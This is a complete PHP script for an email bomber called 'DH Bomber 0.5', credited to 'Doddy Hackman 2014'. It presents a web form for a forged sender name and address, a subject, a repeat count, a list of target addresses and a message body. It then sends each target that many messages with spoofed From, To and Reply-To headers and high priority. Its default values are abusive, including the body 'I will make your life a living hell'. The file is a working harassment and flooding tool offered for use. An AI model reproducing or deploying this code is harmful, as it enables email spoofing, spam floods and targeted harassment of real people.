<?php

// DH Bomber 0.5
// (C) Doddy Hackman 2014

echo '
<style type="text/css">


.main {
margin			: -287px 0px 0px -490px;
border			: White solid 1px;
BORDER-COLOR: #ffffff;
}


#pie {
position: absolute;
bottom: 0;
}

body,a:link {
background-color: #000000;
color:#ffffff;
Courier New;
cursor:crosshair;
font-size: small;
}

input,table.outset,table.bord,table,textarea,select,fieldset,td,tr {
font: normal 10px Verdana, Arial, Helvetica,
sans-serif;
background-color:black;color:#ffffff; 
border: solid 1px #ffffff;
border-color:#ffffff
}

a:link,a:visited,a:active {
color: #ffffff;
font: normal 10px Verdana, Arial, Helvetica,
sans-serif;
text-decoration: none;
}

</style>';

echo "<title>DH Bomber 0.5 (C) Doddy Hackman 2014</title>";

echo '<center><h1>-- == DH Bomber 0.5 == --</h1></center>
<center>
<br>';

if (isset($_POST['bombers'])) {
    
    $cantidad_bien = 0;
    $cantidad_mal  = 0;
    
    $need = "";
    $i    = "";
    $need .= "MIME-Version: 1.0\n";
    $need .= "Content-type: text/html ; charset=iso-8859-1\n";
    $need .= "MIME-Version: 1.0\n";
    $need .= "From: " . $_POST['nombrefalso'] . " <" . $_POST['falso'] . ">\n";
    $need .= "To: " . $_POST['nombrefalso'] . "<" . $_POST['falso'] . ">\n";
    $need .= "Reply-To:" . $_POST['falso'] . "\n";
    $need .= "X-Priority: 1\n";
    $need .= "X-MSMail-Priority:Hight\n";
    $need .= "X-Mailer:Widgets.com Server";
    
    echo "
<table border=1>
<td><center><h2><a href=" . "http://" . $_SERVER['HTTP_HOST'] . $_SERVER['PHP_SELF'] . "" . ">Console</a></h2></center></td><tr>
<td><fieldset>\n\n";
    
    $leyendo_mailist = explode("\n", trim($_POST['mailist']));
    $mails           = array_filter($leyendo_mailist, 'trim');
    
    foreach ($mails as $mail) {
        for ($i = 1; $i <= $_POST['count']; $i++) {
            if (@mail($mail, $_POST['asunto'], $_POST['mensaje'], $need)) {
                $cantidad_bien++;
                echo "[<font color=#00FF00>Sent Successful</font>] Message <b>$i</b> to <b>" . htmlentities($mail) . "</b><br>";
                flush();
            } else {
                echo "[<font color=red>Send Fail</font>] Message <b>$i</b> to <b>" . htmlentities($mail) . "</b><br>";
                $cantidad_mal++;
            }
        }
        echo "<br>";
    }
    
    echo "<font color=#00FF00>[" . $cantidad_bien . "]</font> mails sent <font color=#00FF00>successfully</font>";
    echo "<br><font color=red>[" . $cantidad_mal . "]</font> mails sent <font color=red>failed</font>";
    
    echo "</fieldset></td></table>";
    
    if ($cantidad_bien == 0) {
        echo "<script>alert('Mails Not Send')</script>";
    } else {
        //echo "<script>alert('[".$cantidad_bien."] mails sent successfully')</script>";
    }
    
} else {
    echo '
<form action="" method="POST">
<table border="1">
<tr>
<td>FakeMail : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input name="falso" value="lagarto@juancho.com" size="44" type="text"></td></tr><tr>
<td>FakeName : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input name="nombrefalso" value="Juancho" size="44" type="text"></td></tr><tr>
<td>Subjects : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input name="asunto" value="Hi Bitch" size="44" type="text"></td></tr><tr>
<td>Count : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input name="count" value="1" size="44" type="text"></td></tr><tr>
<td>Mailist : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><textarea name="mailist" rows="7" cols="41">ihateyou@hotmail.com</textarea></td></tr><tr>
<td>Body : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><textarea name="mensaje" rows="7" cols="41">I will make your life a living hell</textarea></td></tr><tr>
</tr></tbody></table><br><br>
<input name="bombers" value="Send" type="submit">
</form>';
}

echo '
<br>
<h1>-- == (C) Doddy Hackman 2014 == --</h1>
</center>';

// The End ?

?>
